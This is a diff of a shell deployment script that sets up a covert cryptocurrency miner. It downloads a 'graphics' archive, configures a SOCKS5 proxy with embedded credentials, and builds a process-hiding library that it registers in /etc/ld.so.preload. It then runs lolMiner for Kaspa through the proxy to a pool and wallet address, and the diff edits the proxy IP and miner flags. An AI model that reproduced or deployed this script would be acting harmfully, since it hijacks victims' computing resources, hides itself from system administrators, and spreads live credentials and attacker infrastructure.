@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 83.97.118.123:1080
+socks5 = 193.202.14.34:1080
 socks5_username = mix10154ND6ZH
 socks5_password = eKrFCOvx
 END
@@ -43,4 +43,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lolMiner --algo KASPA --pool 159.223.188.176:80 --user kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.v100 --tls 0 --ethstratum ETH pause
+./graftcp/graftcp ./lolMiner --algo KASPA --pool 159.223.188.176:80 --user kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.v100
